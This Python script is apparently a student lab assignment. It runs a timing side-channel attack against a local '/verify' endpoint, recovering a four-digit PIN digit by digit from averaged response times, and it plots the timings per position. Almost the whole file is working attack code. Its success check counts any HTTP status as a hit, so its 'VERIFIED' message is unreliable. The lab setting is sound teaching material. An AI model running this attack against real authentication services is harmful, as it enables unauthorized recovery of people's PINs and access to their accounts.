import sys
import time
import random
import requests
from pathlib import Path
from typing import Sequence
import matplotlib.pyplot as plt
from matplotlib.patches import FancyBboxPatch
from matplotlib.ticker import FuncFormatter


# Target configuration
URL = "http://127.0.0.1:5000/verify"
STUDENT_ID = "006"  # TODO: Put your student id (last 3 digits)
HEADERS = {"X-Student-ID": STUDENT_ID, "Content-Type": "application/json"}

# Attack configuration parameters
PIN_LENGTH = 4
SAMPLES_PER_GUESS = 5  # Number of samples per digit to average out noise
DIGITS = "0123456789"


def plot_position_timings(
    position_timings: Sequence[tuple[int, Sequence[float]]],
    output_dir: str = "plots",
) -> None:
    if not position_timings:
        return

    plot_directory = Path(output_dir)
    plot_directory.mkdir(parents=True, exist_ok=True)

    for position, timings in position_timings:
        candidate_labels = [
            "0" * (position - 1) + candidate + "0" * (PIN_LENGTH - position)
            for candidate in DIGITS
        ]

        figure, axis = plt.subplots(figsize=(9, 5.5))
        bars = axis.barh(
            candidate_labels, timings, color="#5b9bf3", edgecolor="#5b9bf3"
        )

        for bar in bars:
            rounded_bar = FancyBboxPatch(
                (bar.get_x(), bar.get_y()),
                bar.get_width(),
                bar.get_height(),
                boxstyle=f"round,pad=0,rounding_size={bar.get_height() / 3}",
                linewidth=0,
                facecolor=bar.get_facecolor(),
            )
            axis.add_patch(rounded_bar)
            bar.set_visible(False)

        # axis.set_title(f"Average Response Time for PIN Position {position}")
        axis.set_xlabel("")
        axis.xaxis.set_major_formatter(FuncFormatter(lambda value, _: f"{value:g}ms"))
        # axis.set_ylabel("Candidates")
        axis.grid(axis="x", linestyle="--", alpha=0.35)
        axis.set_axisbelow(True)
        axis.invert_yaxis()

        # no axis lines
        for spine in axis.spines.values():
            spine.set_visible(False)
        axis.tick_params(axis="both", length=0)
        axis.tick_params(axis="y", pad=8)

        figure.tight_layout()
        figure.savefig(
            plot_directory / f"position_{position}_timings.png",
            dpi=200,
            bbox_inches="tight",
        )
        plt.close(figure)


def measure_response_time(candidate_pin: str) -> tuple[float, int]:
    """Sends a request to the target server and returns the elapsed time in milliseconds."""
    start_time = time.perf_counter()
    try:
        response = requests.post(
            URL, json={"pin": candidate_pin}, headers=HEADERS, timeout=5
        )
        elapsed_ms = (time.perf_counter() - start_time) * 1000
        return elapsed_ms, response.status_code
    except requests.RequestException as e:
        print(f"\n[!] Error connecting to target server: {e}")
        sys.exit(1)


# def get_random_string(size: int):
#     str = ""
#     for _ in range(size):
#         char = DIGITS[random.randint(0, len(DIGITS) - 1)]
#         str += char
#     return str


def get_random_string(size: int, chars: str = DIGITS) -> str:
    return "".join(random.choices(chars, k=size))


def get_average_timing(candidate_pin: str, samples: int) -> tuple[float, bool]:
    """Averages response times across multiple samples to smooth out system noise."""
    avg_time = 0.0
    is_success = False
    # TODO: Request sample number of times and return average elapsed time and whether the request was a success
    remaining_length = PIN_LENGTH - len(candidate_pin)
    for _ in range(samples):
        suffix = get_random_string(remaining_length)
        curr_time, status = measure_response_time(candidate_pin + suffix)
        avg_time += curr_time
        if status:
            is_success = True
    return avg_time / samples, is_success


def find_current_digit(known_prefix: str) -> tuple[str, list[float]]:
    candidates_timing = []
    for c in DIGITS:
        current_candidate = known_prefix + c
        time, _ = get_average_timing(current_candidate, SAMPLES_PER_GUESS)
        candidates_timing.append(time)
    current_digit_index = max(
        range(len(candidates_timing)), key=lambda i: candidates_timing[i]
    )
    return DIGITS[current_digit_index], candidates_timing


def recover_secret_pin():
    print("=" * 60)
    print(f" Starting Timing Attack Exploit against {URL}")
    print(f" Target Student ID : {STUDENT_ID}")
    print(f" Samples per guess : {SAMPLES_PER_GUESS}")
    print("=" * 60 + "\n")

    known_prefix = ""
    position_timings = []
    # TODO: Use the methods to build up the secret pin
    for i in range(PIN_LENGTH):
        current_char, timings = find_current_digit(known_prefix)
        known_prefix += current_char
        position_timings.append((i + 1, timings))

    # Final verification check
    print("[*] Verifying recovered PIN with server...")
    _, is_success = get_average_timing(known_prefix, samples=1)
    if is_success:
        print("\n" + "=" * 60)
        print(f"[+] VERIFIED! Recovered PIN: {known_prefix}")
        print("=" * 60)
    else:
        print(
            "\n[-] Failed to verify r covered PIN. Consider increasing SAMPLES_PER_GUESS."
        )

    plot_position_timings(position_timings)
    print("[*] Saved timing plots to the plots/ directory")


if __name__ == "__main__":
    random.seed(42)
    recover_secret_pin()
